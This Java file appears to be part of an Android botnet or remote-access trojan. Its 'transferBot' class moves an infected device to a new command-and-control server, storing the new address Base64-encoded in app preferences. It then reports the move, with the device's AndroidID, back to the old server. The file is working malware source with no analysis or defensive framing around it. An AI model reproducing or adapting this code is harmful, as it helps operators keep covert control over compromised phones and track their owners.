package u.can.i.up.expert.utils;

import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Base64;

import java.io.UnsupportedEncodingException;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class transferBot extends AsyncTask<String, Void, String> {
    String i = "";
    public transferBot(String i) {
        this.i = i;
    }
    @Override
    protected String doInBackground(String... params) {
        String oldURL = DataSet.getInstance().URL;

        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putString("URL", Base64.encodeToString(i.getBytes(), Base64.DEFAULT));
        DataSet.getInstance().URL = i;

        try {
            Factory.getInputStreamFromUrl(oldURL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Bot Transfered To: " + i);
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {/*httpcalldone*/}
    @Override
    protected void onPreExecute() {/*httpcallexecuting*/}
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
